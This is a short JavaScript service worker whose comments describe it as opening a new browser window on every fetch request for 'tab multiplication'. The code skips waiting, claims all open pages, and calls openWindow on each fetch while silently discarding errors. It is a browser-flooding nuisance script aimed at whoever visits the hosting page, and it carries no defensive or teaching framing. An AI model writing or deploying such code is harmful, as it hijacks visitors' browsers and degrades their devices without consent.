/* service worker — opens a new window on every fetch request
   fires alongside the main page for extra tab multiplication */
self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
self.addEventListener('fetch', event => {
  /* open a new window every time ANY fetch fires on the page */
  self.clients.openWindow('/').catch(()=>{});
});
